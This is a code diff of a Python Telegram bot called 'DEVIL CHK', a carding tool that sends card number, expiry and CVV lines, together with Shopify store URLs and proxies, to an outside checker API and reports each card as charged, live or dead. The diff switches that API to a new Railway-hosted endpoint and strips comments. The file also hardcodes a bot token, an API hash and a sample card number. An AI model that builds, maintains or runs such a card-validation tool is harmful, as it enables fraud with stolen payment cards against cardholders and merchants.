@@ -13,7 +13,8 @@ API_ID = 39825025
 API_HASH = '47170fd9a11b3f591bbc56849519f0f8'
 BOT_TOKEN = '8827673793:AAHKJphZzbQwOKBZS2pHLTDekPvYUrsJT6Y'
 ADMIN_ID = [1707478010]
-CHECKER_API_URL = '‏https://haters.cxchk.site/shopii'
+# الـ API الجديد الخاص بك
+CHECKER_API_URL = 'https://web-production-b4ec9.up.railway.app/shopify'
 
 PREMIUM_USERS_FILE = "premium_users.txt"
 SITES_FILE = 'sites.txt'
@@ -23,7 +24,6 @@ bot = TelegramClient('checker_bot', API_ID, API_HASH).start(bot_token=BOT_TOKEN)
 
 active_sessions = {}
 
-# إيموجي بوت رقم 2 زي ما هي عشان تفضل متوافقة مع وظيفة الاستبدال بتاعته
 PREMIUM_EMOJI_IDS = {
     "✅": "5444987348334965906", "❌": "5447647474984449520", "🔥": "5116414868357907335",
     "⚡": "5219943216781995020", "💳": "5447453226498552490", "💠": "5870498447068502918",
@@ -69,7 +69,6 @@ def get_main_menu_keyboard(user_id=None):
         buttons.append([Button.inline(" Admin Panel", b"admin_panel", style="success")])
     
     return buttons
-
 
 def get_file_lines(filepath):
     if not os.path.exists(filepath):
@@ -180,7 +179,6 @@ def extract_cc(text):
 
 async def check_card(card, site, proxy):
     try:
-        # 1. تنظيف بيانات البطاقة من الأقواس
         clean_card = card.replace('{', '').replace('}', '').strip()
         
         parts = clean_card.split('|')
@@ -190,14 +188,13 @@ async def check_card(card, site, proxy):
         if not site.startswith('http'):
             site = f'https://{site}'
         
-        # 2. إعداد البروكسي
         proxy_str = None
         if proxy:
             proxy_parts = proxy.split(':')
             if len(proxy_parts) >= 2:
                 proxy_str = proxy 
 
-        # 3. إعداد البيانات للرابط الجديد
+        # إعداد البيانات للرابط الجديد المستضاف على Railway
         params = {
             'site': site,
             'cc': clean_card
@@ -205,25 +202,21 @@ async def check_card(card, site, proxy):
         if proxy_str:
             params['proxy'] = proxy_str
             
-        # 4. الاتصال بالموقع (استخدام الرابط الجديد)
-        url = "https://haters.cxchk.site/shopii"
         timeout = aiohttp.ClientTimeout(total=100)
         
         async with aiohttp.ClientSession(timeout=timeout) as session:
-            async with session.get(url, params=params) as resp:
+            async with session.get(CHECKER_API_URL, params=params) as resp:
                 if resp.status != 200:
                     return {'status': 'Site Error', 'message': f'HTTP {resp.status}', 'card': card, 'retry': True}
                 
                 raw = await resp.json(content_type=None)
 
-        # 5. تحليل الرد (المنطق الأصلي للبوت)
         response_msg = raw.get('Response', '')
         price = raw.get('Price', '-')
         if price != '-' and price != 0:
             price = f"${price}"
         gateway = raw.get('Gateway', 'Shopify')
         
-        # استخدام دالة is_site_dead الموجودة مسبقاً في ملفك
         if is_site_dead(response_msg, gateway, price):
             return {'status': 'Site Error', 'message': response_msg, 'card': card, 'retry': True, 'gateway': gateway, 'price': price}
 
@@ -238,7 +231,6 @@ async def check_card(card, site, proxy):
 
     except Exception as e:
         return {'status': 'Dead', 'message': str(e), 'card': card, 'gateway': 'Unknown', 'price': '-'}
-
 
 async def check_card_with_retry(card, sites, proxies, max_retries=2):
     last_result = None
@@ -336,7 +328,7 @@ async def send_final_results(user_id, results):
 
     summary = f"""<b>⚡💳 ㅤ#𝐃𝐄𝐕𝐈𝐋 𝐂𝐇𝐊  💳⚡</b>
 <b>━━━━━━━━━━━━━━━━━</b>
-<b>⚡💠 𝐑𝐞𝐬𝐮𝐥𝐭𝐬</b>
+<b>⚡💠 𝐑e𝐬𝐮𝐥𝐭𝐬</b>
 <blockquote>💳 Total: {results['total']} | ✅ Charged: {len(results['charged'])} | 🔥 Live: {len(results['approved'])} | ❌ Dead: {len(results['dead'])}</blockquote>
 <blockquote>🌐 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: 🔥 {gateway}</blockquote>
 <blockquote>⏱️ Time: {hours}h {minutes}m {seconds}s</blockquote>
@@ -379,7 +371,6 @@ async def send_final_results(user_id, results):
         os.remove(filename)
     except:
         pass
-
 
 async def test_site(site, proxy):
     test_card = "4031630422575208|01|2030|280"
@@ -447,7 +438,6 @@ async def test_proxy(proxy):
 @bot.on(events.NewMessage(pattern='/start'))
 async def start(event):
     user_id = event.sender_id
-    is_prem = is_premium(user_id)
     
     welcome_text = """<b>⚡💳 Welcome to DEVIL CHK ! 💳⚡</b>
 <b>━━━━━━━━━━━━━━━━━</b>
@@ -1134,7 +1124,6 @@ async def remove_site_command(event):
     except Exception as e:
         await event.reply(premium_emoji(f"❌ Error removing site: {e}"), parse_mode='html')
         
-        
 @bot.on(events.NewMessage(pattern='/addsites'))
 async def addsites_command(event):
     user_id = event.sender_id
@@ -1215,7 +1204,6 @@ async def addsites_command(event):
         
     except Exception as e:
         await status_msg.edit(premium_emoji(f"❌ Error: {e}"), parse_mode='html')
-        
         
 @bot.on(events.NewMessage(pattern='/addpremium'))
 async def add_premium_command(event):
